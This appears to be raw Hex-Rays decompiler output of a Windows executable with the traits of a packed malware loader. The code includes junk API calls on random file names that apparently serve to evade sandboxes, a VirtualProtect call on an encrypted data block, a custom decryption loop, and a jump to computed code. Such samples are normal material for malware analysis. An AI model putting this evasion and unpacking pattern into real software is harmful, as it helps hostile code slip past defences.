/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401023();
int start();
unsigned int __stdcall sub_41441E(unsigned int a1, int a2, _DWORD *a3);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetLastError();
// LPSTR __stdcall GetCommandLineA();
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[8] =
{
  -1712732269,
  -901668369,
  1112231054,
  -1030485430,
  634923462,
  400275332,
  760914260,
  -722914325
}; // weak
WCHAR aOn35Cli[] = L"\u6E4F\u3533\u432E\u694C"; // idb
CHAR a9g7h15uk6ebp9t[] = "9g7H15uK6ebP9ttFu93.BPK"; // idb
WCHAR FileName[] = L"\u4A37\u312E\u6950"; // idb
CHAR a2hmatjdyww5cba[] = "2HmATjDYww5CBA4u5wRBaYChz.g2O"; // idb
WCHAR aC85rw2yncobpdm[] = L"\u3863\u7235\u3257\u4E59\u6F43\u7062\u6D44\u506A\u6C43\u682E\u5263"; // idb
CHAR aJ7xzhmwbs68oe6[] = "j7xzhMwBs68oe65aW6ec.qSH"; // idb
CHAR LibFileName[] = "rpcrt4.DLL"; // idb
CHAR aXfyqlfcjmphfrj[] = "xfYQlFCjMpHFRJdUjYUhxwa.9rs"; // idb
CHAR a7elshaojh4zcXk[] = "7elshAOJh4zC.Xkt"; // idb
CHAR ProcName[] = "RpcRevertToSelf"; // idb
CHAR aL1ncpo5ng[] = "l1ncPO.5nG"; // idb
CHAR aIpmbbfswkcXtw[] = "ipMbbfSWkC.Xtw"; // idb


//----- (00401023) --------------------------------------------------------
int sub_401023()
{
  return MEMORY[0xE8F6B5B]();
}

//----- (00414059) --------------------------------------------------------
int start()
{
  HANDLE v0; // eax
  int v2; // [esp-8h] [ebp-48h]
  DWORD *v3; // [esp-4h] [ebp-44h]
  void *v4; // [esp-4h] [ebp-44h]
  HANDLE v5; // [esp+0h] [ebp-40h]
  HANDLE v6; // [esp+4h] [ebp-3Ch]
  DWORD *v7; // [esp+8h] [ebp-38h]
  RPC_STATUS (__stdcall *RpcRevertToSelf)(); // [esp+Ch] [ebp-34h]
  HANDLE hObject; // [esp+10h] [ebp-30h]
  HMODULE hModule; // [esp+14h] [ebp-2Ch]
  int v11; // [esp+28h] [ebp-18h]
  int v12; // [esp+28h] [ebp-18h]
  HANDLE v13; // [esp+30h] [ebp-10h]
  HANDLE v14; // [esp+34h] [ebp-Ch]

  GetLastError();
  GetCommandLineA();
  GetCommandLineA();
  while ( CreateFileW(FileName, 0x80000000, 4u, 0, 3u, 0x181u, 0) == (HANDLE)-1 )
  {
    v3 = 0;
    v2 = -1;
LABEL_4:
    GetFileSize((HANDLE)v2, v3);
    CreateFileA(a7elshaojh4zcXk, 0x20000000u, 7u, 0, 3u, 0x1A3u, 0);
    v4 = 0;
    while ( 1 )
    {
      v5 = CreateFileA(a9g7h15uk6ebp9t, 0xA0000000, 7u, 0, 3u, 0xA3u, v4);
      v13 = CreateFileA(a2hmatjdyww5cba, 0x60000000u, 0, 0, 3u, 0x125u, 0);
      GetFileType(v5);
      if ( CreateFileA(aIpmbbfswkcXtw, 0xE0000000, 6u, 0, 3u, 0x122u, 0) != (HANDLE)-1 )
        break;
      GetLastError();
      hObject = CreateFileA(aL1ncpo5ng, 0x60000000u, 1u, 0, 3u, 0x1A5u, 0);
      if ( hObject != (HANDLE)-1 )
        goto LABEL_4;
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetFileSize(v13, 0);
      CloseHandle((HANDLE)0xFFFFFFFF);
      hModule = LoadLibraryA(LibFileName);
      GetCommandLineA();
      CloseHandle((HANDLE)0xFFFFFFFF);
      RpcRevertToSelf = GetProcAddress(hModule, ProcName);
      GetCommandLineA();
      GetCommandLineA();
      GetFileSize((HANDLE)0xFFFFFFFF, 0);
      GetLastError();
      if ( CreateFileA(aJ7xzhmwbs68oe6, 0xE0000000, 5u, 0, 3u, 0x86u, 0) == (HANDLE)-1 )
      {
        v12 = RpcRevertToSelf();
        GetLastError();
        CreateFileW(aC85rw2yncobpdm, 0x60000000u, 1u, 0, 3u, 0x183u, 0);
        GetFileType((HANDLE)0xFFFFFFFF);
        __asm { jmp     [ebp+var_38] }
      }
    }
  }
  v0 = CreateFileW(aOn35Cli, 0x20000000u, 5u, 0, 3u, 0x182u, 0);
  VirtualProtect(dword_401000, (SIZE_T)v5, (DWORD)v0, v7);
  GetFileType(v6);
  GetLastError();
  GetCommandLineA();
  GetFileType(hObject);
  GetLastError();
  v14 = CreateFileA(aXfyqlfcjmphfrj, 0x20000000u, 1u, 0, 3u, 0xA7u, 0);
  GetFileSize((HANDLE)0x13041, 0);
  GetFileType(v14);
  ((void (*)(void))((char *)sub_41441E + v11 - 1725))();
  return sub_401023();
}
// 4140AD: variable 'v2' is possibly undefined
// 4140AD: variable 'v3' is possibly undefined
// 4140F9: variable 'v4' is possibly undefined
// 414351: variable 'v5' is possibly undefined
// 414351: variable 'v7' is possibly undefined
// 41435D: variable 'v6' is possibly undefined
// 414380: variable 'hObject' is possibly undefined
// 4143C6: variable 'v11' is possibly undefined
// 401000: using guessed type int dword_401000[8];

//----- (0041441E) --------------------------------------------------------
unsigned int __stdcall sub_41441E(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int result; // eax

  result = a1 >> 2;
  do
  {
    *a3 -= a2;
    *a3 += 126494107;
    *a3 += 33885920;
    *a3 -= a2;
    *a3 = __ROR4__(*a3, 183);
    *a3 += 2111862351;
    *a3 = -*a3;
    ++a3;
    --result;
  }
  while ( result );
  return result;
}

// nfuncs=3 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
// ALL OK, 3 function(s) have been successfully decompiled
